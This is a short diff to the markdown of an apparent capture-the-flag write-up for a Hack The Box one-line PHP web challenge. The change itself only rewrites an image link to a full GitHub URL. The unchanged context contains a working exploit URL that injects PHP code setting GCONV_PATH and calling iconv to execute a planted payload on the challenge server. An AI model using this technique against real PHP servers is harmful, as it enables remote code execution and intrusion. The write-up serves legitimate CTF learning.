@@ -56,4 +56,4 @@ Then we only have to execute the payload and see if it printed anything to /test
 
 `http://docker.hackthebox.eu:31047/?%F0%9F%8D%BC=$%F0%9F%96%8D%EF%B8%8F;putenv(%22GCONV_PATH=/tmp%22);iconv(%22payload%22,%20%22UTF-8%22,%20%22whatever%22);`
 
-![flag](images/4.png "Flag")
+![flag](https://github.com/INSSec-UniWA/Writeups/raw/htb-unictf-2021-finals/HTB-UniCTF-2021/Finals/Web/one%20line%20php%20challenge/images/4.png "Flag")
